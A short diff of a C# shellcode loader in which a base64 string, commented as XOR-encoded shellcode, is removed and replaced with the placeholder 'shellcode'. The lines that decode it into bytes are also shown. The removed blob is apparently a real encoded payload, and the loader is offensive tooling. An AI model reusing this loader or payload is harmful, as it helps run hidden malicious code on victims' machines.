@@ -30,7 +30,7 @@ namespace ShellcodeLoader
             // Replace the following with your shellcode
 
             // base64 of xored shellcode
-            string base64String = "VyVtq83vy0QKmg2LIJ3fIJ/jIJ/7IL/HpHqljfwQB/GO18/DiwwgpswoST+9/Ea9u0all0ajurUM48w++ka2i8w8IIT3SPemIPlkqhveVGEuZMDubPUP3jvs1jXU1umaT5Vk8+nueKtkp4Zk89HueEbrIMw/IonLj5a0ypS1+jIP9JK1IN8EJpCFqkBqGc3vq52HmkaALDI6ED1aCZuHDVhSNjI6l8uToU0US7jqEIr82aKFq54Qfq6Ox67BzrWKqw==\r\n";
+            string base64String = "shellcode";
             
             // Base64 decode
             byte[] shellcode = Convert.FromBase64String(base64String);
